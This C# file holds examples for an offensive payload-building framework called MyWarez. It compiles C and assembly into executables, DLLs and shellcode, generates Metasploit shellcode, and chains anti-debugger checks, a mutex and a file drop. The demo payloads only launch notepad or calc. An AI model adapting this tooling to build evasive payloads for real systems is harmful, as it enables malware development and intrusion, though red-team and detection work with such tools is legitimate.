using MyWarez.Base;
using MyWarez.Core;
using MyWarez.Payloads;
using MyWarez.Plugins.Yasm;
using MyWarez.Plugins.CCxxEvasions;
using MyWarez.Plugins.Metasploit;

namespace Examples
{
    public static partial class AttackExamples
    {
        // C/C++ with MSVC Example
        private static IAttack CCxxMsvcExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "CCxxMsvc";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            var cmdline = "notepad"; // any commandline
            // CreateProcess is C/C++ code that will create a process using Kernel32!CreateProcessA
            var createProcessSource = new CreateProcess(cmdline);
            // FunctionCallExeWinMainCCxxSource is C/C++ code containing a template WinMain implentation that calls the inputs entry point function
            var createProcessExeSource = new FunctionCallExeWinMainCCxxSource(createProcessSource);
            // createProcessExeSource contains the code for WinMain AND the code to create a process from createProcessSource

            // C/C++ code can be compiled using the MSVC toolchain
            // StaticLibrary represents compiled code
            // Msvc.Compiler accepts Msvc.Compiler.Config as an argument. If None is specifed, then the default is used. The default is good for the majority of cases
            // (ICCxxCompiler<Win64ObjectFile>) means that this is a C/C++ Compiler that produces object files of type Win64ObjectFile (MSVC's object format for 64-bit code)
            var createProcessExeStaticLibrary = ((ICCxxCompiler<Win64ObjectFile>)new MyWarez.Plugins.Msvc.Compiler()).Compile(createProcessExeSource);
            // The Linker is used to create an executable using the compiled code from the compilation step
            // Msvc.Linker accepts Msvc.Linker.Config as an argument. If None is specifed, then the default is used. The default is good for the majority of cases
            // (ILinker<Win64ObjectFile, Executable>) means that this is a Linker that access object files of type Win64ObjectFile and produces executables of type Executable (.exe)
            var createProcessExe = ((ILinker<Win64ObjectFile, Executable>)new MyWarez.Plugins.Msvc.Linker()).Link(createProcessExeStaticLibrary);

            // The MSVC toolchain can also be used to create a DLL from C/C++ source
            // CreateProcess implements the interface ICFunction. ICFunction represents a callable (using the C calling convention) function. The property "Name" of ICFunction is representative of the function's (unmangled) symbol name
            var exportedFunctionName = ((ICFunction)createProcessSource).Name;
            // DLLs can export functions for other programs to call
            var createProcessDllSource = new SkeletonDllMainCCxxSource(createProcessSource, exportedFunctions: new[] { exportedFunctionName });
            var createProcessDllStaticLibrary = ((ICCxxCompiler<Win64ObjectFile>)new MyWarez.Plugins.Msvc.Compiler()).Compile(createProcessDllSource);
            // Msvc.Linker must be explictly told what function(s) to export
            // (ILinker<Win64ObjectFile, Executable>) means that this is a Linker that access object files of type Win64ObjectFile and produces executables of type DynamicLinkLibrary (.dll)
            var createProcessDll = ((ILinker<Win64ObjectFile, DynamicLinkLibrary>)new MyWarez.Plugins.Msvc.Linker(exportedFunctions: createProcessDllSource.ExportedFunctions)).Link(createProcessDllStaticLibrary);

            samplesOutput.Add("CCxxMsvcNotepad.exe", createProcessExe); // Double click to confirm that notepad spawns
            samplesOutput.Add("CCxxMsvcNotepad.dll", createProcessDll); // run: "rundll32 Sample8Notepad.dll,CreateProcessFunction" to confirm that notepad spawns

            attack.Generate();
            return attack;
        }


        // C/C++ with cl.exe (MSVC) & GoLink.exe
        private static IAttack CCxxClGoLinkExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "CCxxClGoLink";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            var cmdline = "notepad";
            var createProcessSource = new CreateProcess(cmdline);
            // The CRT entry points (mainCRTStartup, wmainCRTStartup, WinMainCRTStartup, wWinMainCRTStartup, _DllMainCRTStartup) don't work GoLink
            // So, we must define our own entrypoint
            var entryPoint = ((ICFunction)createProcessSource).Name;

            // GoLink is incompatiable with Whole Program Optimization (cl.exe's /GL option)
            var compilerConfig = new MyWarez.Plugins.Msvc.Compiler.Config(GL: false);
            var createProcessStaticLibrary = ((ICCxxCompiler<Win64ObjectFile>)new MyWarez.Plugins.Msvc.Compiler(compilerConfig)).Compile(createProcessSource);
            // MSVC's /GS option needs code from libcmt.lib
            // GoLink can't use static library files (.lib), so a workaround is to unpack the .lib into its individual object (.obj) files
            var libraryObjectFiles = new StaticLibrary<Win64ObjectFile>(new[] { MyWarez.Plugins.Msvc.StaticLibraries.libcmtWin64() }).ObjectFiles;
            //var libraryObjectFiles = new StaticLibrary<Win64ObjectFile>(new[] { MyWarez.Plugins.Msvc.StaticLibraries.libcmtWin64(), MyWarez.Plugins.Msvc.StaticLibraries.libucrtWin64(), MyWarez.Plugins.Msvc.StaticLibraries.libvcruntimeWin64() }).ObjectFiles;
            // libucrt.lib and libvcruntime.lib are other parts of the MSVC C Run-Time static libraries
            //      they are omitted here, omitting them saves time since extract object files from .lib files takes a while.

            // Use GoLink as the linker instead of MSVC's linker (link.exe)
            // We must specify an entrypoint with GoLink since the default entrypoint is always "START"
            //      Meanwhile MSVC would default to the appropriate CRT entrypoint 
            var linkerConfig = new MyWarez.Plugins.GoDevTool.Linker.Config(ENTRY: entryPoint);
            var createProcessExe = ((ILinker<Win64ObjectFile, Executable>)new MyWarez.Plugins.GoDevTool.Linker(linkerConfig, importStaticLibraryObjects: libraryObjectFiles)).Link(createProcessStaticLibrary);

            samplesOutput.Add("CCxxClGoLinkNotepad.exe", createProcessExe); // Double click to confirm that notepad spawns

            attack.Generate();
            return attack;
        }

        // Constructing a large C/C++ Example
        private static IAttack LargeCCxxExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "LargeCCxx";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            // spawn notepad
            var createProcessSource1 = new CreateProcess("notepad");
            // spawn calc
            var createProcessSource2 = new CreateProcess("calc");
            // returns the we specified path
            var targetPathSource = new StaticTargetPathCCxxSource(@"C:\Users\Public\baby.txt");
            // returns the data we specified
            var fileResourceSource = new StaticFileResourceCCxxSource(new byte[] { 0x65, 0x65, 0x65, 0x65 });
            // Drop a file to disk (drop the file "C:\Users\Public\baby.txt" to disk with contents "AAAA")
            var writeFileSource = new WriteFileResourceCCxxSource<StaticTargetPathCCxxSource, StaticFileResourceCCxxSource>(targetPathSource, fileResourceSource);
            // Call a series C functions in order
            var functionCallsSource = new SequentialFunctionCallCCxxSource(new IParameterlessCFunction[] { createProcessSource1, writeFileSource });
            // Limit to at most 1 running instance of this code at a time by creating a Global mutex. Only 1 process can have an open handle to a global mutex at a time
            var mutexSource = new MutexSingletonCCxxSource(functionCallsSource, mutexName: @"Global\SomeMutexName");
            // Check a conditional statement, (check if a debugger is attached)
            var antidebuggerSource1 = new NotIsDebuggerPresentCCxxSource(); // Returns true if it's safe to execute (No debugger is attached)
            var antidebuggerSource2 = new RemoteDebuggerCCxxSource(); // Retruns true if it's safe to execute (No debugger is attached)
            var ifElseSource = new IfElseFunctionCallCCxxSource(
                "{0} && {1}", // If this boolean expression is true
                new IParameterlessCFunction[] { antidebuggerSource1, antidebuggerSource2 },
                trueCaseFunction: mutexSource, // Then execute this
                falseCaseFunction: createProcessSource2); // Otherwise execute this
            var createThreadSource = new CreateThreadCCxxSource(ifElseSource); // Create a new thread and execute this
            var exeWinMainSource = new FunctionCallExeWinMainCCxxSource(createThreadSource);
            var exeSource = exeWinMainSource;
            // Summary,
            //  In the main function (WinMain),
            //  Create a thread
            //  In the new thread, Check if a debugger is present using the IsDebuggerPresent technique and the CheckRemoteDebuggerPresent technique
            //      If a debugger is attached,
            //          spawn calc
            //      Else // debuger is not attached
            //          create a mutex. If the mutex is free,
            //              Spawn notepad
            //              Drop C:\Users\Public\baby.txt to disk


            var createProcessExeStaticLibrary = ((ICCxxCompiler<Win64ObjectFile>)new MyWarez.Plugins.Msvc.Compiler()).Compile(exeSource);
            var createProcessExe = ((ILinker<Win64ObjectFile, Executable>)new MyWarez.Plugins.Msvc.Linker()).Link(createProcessExeStaticLibrary);

            samplesOutput.Add("LargeCCxx.exe", createProcessExe);
            // Double click the to confirm that notepad spawns.
            // Open the sample in WinDbg to confirm that calc spawns when a debugger is attached

            attack.Generate();
            return attack;
        }

        // Assembly Example with shellcode using Yasm + GoLink
        private static IAttack AssemblyShellcodeYasmGoLinkExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "AssemblyShellcodeYasmGoLink";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            // Metasploit payloads can be easily generated
            var shellcodeBytes = MetasploitPayloadFactory.Generate(format: "raw", payload: "windows/x64/exec", options: "EXITFUNC=thread CMD=notepad");
            // They'll need to be wrapped in the appropriate Class.
            var shellcode = new ShellcodeX64(shellcodeBytes);
            // This is YASM Assembly Langauge that includes the shellcode instructions as-is
            var rawShellcodeAsm = new RawShellcodeYasmAssemblySource(
                shellcode,
                symbolName: "SheSellsShellCodesByTheSilkRoad", // A label for the start of the shellcode. Can be called like a function from C
                sectionWritable: true // Some shellcode needs to be in a memory page that has RWX permissions. This not one of them, but lets give the section Write permissions anyways
                );
            var staticLibrary = ((IAssembler<YASM, Win64ObjectFile>)new MyWarez.Plugins.Yasm.Yasm()).Assemble(rawShellcodeAsm);
            var entryPoint = ((ICFunction)rawShellcodeAsm).Name;

            var linkerConfig = new MyWarez.Plugins.GoDevTool.Linker.Config(ENTRY: entryPoint);
            var createProcessExe = ((ILinker<Win64ObjectFile, Executable>)new MyWarez.Plugins.GoDevTool.Linker(linkerConfig)).Link(staticLibrary);

            samplesOutput.Add("AssemblyShellcodeYasmGoLinkNotepad.exe", createProcessExe); // Double click to confirm that notepad spawns

            // Note: Linking with MSVC instead of GoLink would also be an option

            attack.Generate();
            return attack;
        }

        // C -> Shellcode using MSVC Example
        private static IAttack CShellcodeMsvcExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "CShellcodeMsvc";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            // Uses a technique from 2010/2013 to use MSVC to compile C code into Shellcode
            // http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html
            // https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
            // Metasploit started doing the same thing at the end of 2019 (But with the Mingw-w64 toolchain instead of MSVC)
            // https://blog.rapid7.com/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/

            var createProcessSource = new CreateProcess("notepad");
            // The first argument to CompileToShellcode must implement IShellcodeCCxxSourceIParameterlessCFunction
            //      For the most part the means it is a subclass of ShellcodeCCxxSource and implements IParameterlessCFunction
            // See the note at the end of this method for the characteristics of "shellcodable" C source.
            var shellcode = MyWarez.Plugins.Msvc.Utils.CompileToShellcode(createProcessSource, (StaticLibrary<Win64ObjectFile>)null, optimize: true);
            // There's also a parameter to specify optimizations, The default is not optimized since there's a chance optimization will result in nonfunctional shellcode.

            // shellcode -> exe wrapper from Sample12 
            var rawShellcodeAsm = new RawShellcodeYasmAssemblySource(shellcode, symbolName: "SheSellsShellCodesByTheSilkRoad");
            var staticLibrary = ((IAssembler<YASM, Win64ObjectFile>)new MyWarez.Plugins.Yasm.Yasm()).Assemble(rawShellcodeAsm);
            var entryPoint = ((ICFunction)rawShellcodeAsm).Name;
            var linkerConfig = new MyWarez.Plugins.GoDevTool.Linker.Config(ENTRY: entryPoint);
            var createProcessExe = ((ILinker<Win64ObjectFile, Executable>)new MyWarez.Plugins.GoDevTool.Linker(linkerConfig)).Link(staticLibrary);

            samplesOutput.Add("CShellcodeMsvcNotepad.exe", createProcessExe); // Double click to confirm that notepad spawns

            attack.Generate();
            return attack;
        }
        // Steps for writing C code that can be turned into shellcode:
        // Code must be in C (and have a file extension of ".c")
        // Declare (and don't initilize) all variables that the start of functions
        // Initialze variables, if any.
        // For strings, don't use string constants (qoute notation) to initialize, use arrays instead.
        // Write Win32 API calls as you normally would, ShellcodeCCxxSource will automagically swap out the calls for dynamically loaded versions
        //          Make sure there is no space between the API name and "("
        // Don't use the C runtime library
        //      Use compiler intrinsics where possible
        //      Otherwise copy and paste the implementation of needed C runtime functions from GCC's or ucrt's source code. Or roll your own.
        //      Declare helper functions as static and change the name so that they don't conflict with functions in the CRT
        // Have at most 1 (nonstatic) function per file.
        // Place "//HEADERS" near the top of the source file(s)
        // At the top of every function body, place "//DECLARATIONS"
        // After the declarations in a function body, place "//INITIALIZATIONS"
        // For an example, see Resources/Payloads/Windows/Execution/NativeAPI/CreateProcess/CreateProcess.c 
        // Also, prototypes for the Win32 API functions used need to be added to Resources\Base\CCxxSource\ShellodeCCxxSource\DynamicallyLoadedFunctionSignatures.h


        // Constructing a large C -> Shellcode with MSVC Example

        private static IAttack LargeCShellcodeMsvcExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "LargeCShellcodeMsvc";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            // Same code from LargeCCxx (Some classes changed to their ShellcodeCCxxSource versions)
            // The CCxxSource and ShellcodeCCxxSource of class should be identical except some implented interfaces, some types, and the different parent class

            var createProcessSource1 = new CreateProcess("notepad");
            var createProcessSource2 = new CreateProcess("calc");
            var targetPathSource = new StaticTargetPathCCxxSource(@"C:\Users\Public\baby.txt");
            var fileResourceSource = new StaticFileResourceCCxxSource(new byte[] { 0x65, 0x65, 0x65, 0x65 });
            var writeFileSource = new WriteFileResourceCCxxSource<StaticTargetPathCCxxSource, StaticFileResourceCCxxSource>(targetPathSource, fileResourceSource);
            var functionCallsSource = new SequentialFunctionCallShellcodeCCxxSource(new IShellcodeParameterlessCFunction[] { createProcessSource1, writeFileSource });
            var mutexSource = new MutexSingletonShellcodeCCxxSource(functionCallsSource, mutexName: @"Global\SomeMutexName");
            var antidebuggerSource1 = new NotIsDebuggerPresentCCxxSource();
            var antidebuggerSource2 = new RemoteDebuggerCCxxSource();
            var ifElseSource = new IfElseFunctionCallShellcodeCCxxSource(
                "{0} && {1}",
                new IShellcodeParameterlessCFunction[] { antidebuggerSource1, antidebuggerSource2 },
                trueCaseFunction: mutexSource,
                falseCaseFunction: createProcessSource2);
            var createThreadSource = new CreateThreadShellcodeCCxxSource(ifElseSource);
            var shellcodeSource = createThreadSource;
            // Summary, Same summary as the one from LargeCCxx (minus WinMain)

            var shellcode = MyWarez.Plugins.Msvc.Utils.CompileToShellcode(shellcodeSource, (StaticLibrary<Win64ObjectFile>)null, optimize: true);

            // shellcode -> exe wrapper from AssemblyShellcodeYasmGoLink 
            var rawShellcodeAsm = new RawShellcodeYasmAssemblySource(shellcode, symbolName: "SheSellsShellCodesByTheSilkRoad");
            var staticLibrary = ((IAssembler<YASM, Win64ObjectFile>)new MyWarez.Plugins.Yasm.Yasm()).Assemble(rawShellcodeAsm);
            var entryPoint = ((ICFunction)rawShellcodeAsm).Name;
            var linkerConfig = new MyWarez.Plugins.GoDevTool.Linker.Config(ENTRY: entryPoint);
            var createProcessExe = ((ILinker<Win64ObjectFile, Executable>)new MyWarez.Plugins.GoDevTool.Linker(linkerConfig)).Link(staticLibrary);
            // Note: MSVC could also be used for the linker if desired

            samplesOutput.Add("LargeCShellcodeMsvcNotepad.exe", createProcessExe);
            // Double click the to confirm that notepad spawns.
            // Open the sample in WinDbg to confirm that calc spawns when a debugger is attached


            attack.Generate();
            return attack;
        }
    }
}
